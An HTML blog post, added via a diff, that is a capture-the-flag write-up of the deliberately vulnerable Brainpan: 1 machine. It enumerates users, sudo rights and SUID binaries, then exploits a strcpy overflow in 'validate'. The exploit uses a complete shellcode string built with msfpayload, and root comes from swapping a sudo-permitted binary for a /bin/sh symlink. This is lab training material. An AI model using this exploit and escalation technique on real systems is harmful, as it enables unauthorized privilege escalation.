@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Brainpan: 1 - Part 2 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-05-28">May 28, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/brainpan">brainpan</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Brainpan: 1 - Part 2</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h2 id="shell:edcb2de0cbbe69c925e398e09c0d9e58">Shell</h2>
+
+<p>Now I had a shell, I could start exploring the system.</p>
+
+<pre><code class="language-text">cat /etc/passwd
+reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
+anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
+puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
+  
+cat /etc/group
+sudo:x:27:reynard
+  
+sudo -l
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+  
+find / -perm -4000 -type f 2&gt;/dev/null
+
+[...snip...]
+
+/usr/local/bin/validate
+</code></pre>
+
+<p>So a few things here :)</p>
+
+<p>It seems puck can run <code>anansi_util</code> with sudo privileges.  I tried playing around with it a little bit, but couldn&rsquo;t make it do much.</p>
+
+<pre><code class="language-text">sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+</code></pre>
+
+<p>Reviewing the list of SUID binaries, <code>/usr/local/bin/validate</code> stood out to me as I&rsquo;d never seen it before.  I was able to collect some more information about it.</p>
+
+<pre><code class="language-text">ls -la /usr/local/bin/validate
+-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate
+  
+getfacl /usr/local/bin/validate
+getfacl: Removing leading '/' from absolute path names
+# file: usr/local/bin/validate
+# owner: anansi
+# group: anansi
+# flags: s--
+user::rwx
+group::r-x
+other::r-x
+  
+/usr/local/bin/validate
+usage /usr/local/bin/validate &lt;input&gt;
+  
+file /usr/local/bin/validate
+/usr/local/bin/validate: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x01d3b7c4bc6eda9d4b4e9c25e036a36349b9630a, not stripped
+</code></pre>
+
+<p>Hmm, so a suspicious binary with a single user input&hellip;  Brainpan doesn&rsquo;t have strings installed, so I transferred the binary to my Kali machine to analyse.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# strings validate
+[...snip...]
+strcpy
+</code></pre>
+
+<p>So the user input is again passed using the vulnerable <code>strcpy</code> function.  If we could exploit this, we would gain access as <code>anansi</code>.</p>
+
+<h2 id="exploiting-validate:edcb2de0cbbe69c925e398e09c0d9e58">Exploiting Validate</h2>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# ./validate `python -c 'print (&quot;A&quot; * 200)'`
+Segmentation fault
+</code></pre>
+
+<p>I was able to crash the application, now to load it up in gdb and have a closer look&hellip;</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# gdb -q ./validate
+Reading symbols from /root/brainpan/1/validate...done.
+(gdb) r `python -c 'print (&quot;A&quot; * 200)'`
+Starting program: /root/brainpan/1/validate `python -c 'print (&quot;A&quot; * 200)'`
+  
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+  
+(gdb) i r
+eax            0xbffff378   -1073745032
+ecx            0x0  0
+edx            0xc9 201
+ebx            0x41414141   1094795585
+esp            0xbffff3f0   0xbffff3f0
+ebp            0x41414141   0x41414141
+esi            0x0  0
+edi            0x0  0
+eip            0x41414141   0x41414141
+</code></pre>
+
+<p>More analysis of the stack showed that I could overwrite into <code>ESP</code>, but I couldn&rsquo;t find a <code>JMP ESP</code> instruction within the binary to use as I did earlier.  However I was also overwriting <code>EAX</code> and there was a <code>CALL EAX</code> instruction in the binary.</p>
+
+<pre><code class="language-text">root@kali:~/brainpan/1# objdump -D validate -M intel | grep eax | grep call
+ 8048468:   ff 14 85 14 9f 04 08    call   DWORD PTR [eax*4+0x8049f14]
+ 80484af:   ff d0                   call   eax
+ 804862b:   ff d0                   call   eax
+</code></pre>
+
+<p>I found that the <code>EIP</code> offset was <code>116 bytes</code> (using the pattern_create/offset method).</p>
+
+<pre><code class="language-text">(gdb) r `python -c 'print (&quot;A&quot; * 116) + (&quot;B&quot; * 4)'`
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+  
+(gdb) x/40x $eax -4
+0xbffff3c4: 0x00000001  0x41414141  0x41414141  0x41414141
+0xbffff3d4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff3e4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff3f4: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff404: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff414: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff424: 0x41414141  0x41414141  0x41414141  0x41414141
+0xbffff434: 0x41414141  0x41414141  0x42424242  0xbffff600
+0xbffff444: 0xb7fbeff4  0x080485b0  0xbffff468  0xb7e8e7f5
+0xbffff454: 0xb7ff0590  0x080485bb  0xb7fbeff4  0x080485b0
+</code></pre>
+
+<p>So if I&rsquo;m going to exploit this, I will probably need to include shellcode at the start of the buffer, then use the <code>CALL EAX</code> to jump up the stack to it.  It seems <code>EAX</code> starts at <code>0xbffff3c8</code> and ends at <code>0xbffff438</code>; which is a total of <code>112 bytes</code> - plenty of space for some decent shellcode.</p>
+
+<p>I don&rsquo;t need to create anything as cumbersome as full reverse shellcode - since I already have access to the system, all I require is a new instance of bash.  This will inherit the privileges of anansi since the suid binary is executing it.</p>
+
+<pre><code class="language-text">root@kali:~# msfpayload linux/x86/exec CMD=&quot;/bin/sh&quot; R | msfencode -e x86/shikata_ga_nai -b '\x00' -t c
+[*] x86/shikata_ga_nai succeeded with size 70 (iteration=1)
+</code></pre>
+
+<p>So I just pieced this together as: <code>shellcode + padding + call eax</code></p>
+
+<pre><code class="language-text">id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+  
+/usr/local/bin/validate `python -c 'print &quot;\xb8\x83\x64\xca\x02\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x83\xea\xfc\x31\x42\x11\x03\x42\x11\xe2\x76\x0e\xc1\x5a\xe1\x9d\xb3\x32\x3c\x41\xb5\x24\x56\xaa\xb6\xc2\xa6\xdc\x17\x71\xcf\x72\xe1\x96\x5d\x63\xf9\x58\x61\x73\xd5\x3a\x08\x1d\x06\xc8\xa2\xe1\x0f\x7d\xbb\x03\x62\x01&quot; + (&quot;\x90&quot; * 46) + &quot;\xaf\x84\x04\x08&quot;'`
+  
+id
+uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
+</code></pre>
+
+<p>Excellent.  Now I have access as anansi, I could get into their home directory and check out <code>anansi_util</code> some more.</p>
+
+<pre><code class="language-text">cd /home/anansi/bin
+ls -la
+-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 anansi_util
+  
+getfacl anansi_util
+# file: anansi_util
+# owner: anansi
+# group: anansi
+user::rwx
+group::r-x
+other::r-x
+</code></pre>
+
+<p>So this is a binary which we have full control over (as anansi) and can execute with sudo rights (as puck).  This is actually very trivial to leverage.  I was able to simply move the exisiting binary, and replace it with a symlink to <code>/bin/sh</code>.</p>
+
+<pre><code class="language-text">mv anansi_util anansi_util.bk
+ln -s /bin/sh ./anansi_util
+  
+ls -la
+lrwxrwxrwx 1 anansi puck      7 May 29 12:36 anansi_util -&gt; /bin/sh
+-rwxr-xr-x 1 anansi anansi 7256 Mar  4  2013 anansi_util.bk
+  
+sudo /home/anansi/bin/anansi_util
+id; whoami
+uid=0(root) gid=0(root) groups=0(root)
+root
+</code></pre>
+
+<p>w00t!
+I couldn&rsquo;t find an obvious final flag, so assume the challenge ends here.</p>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
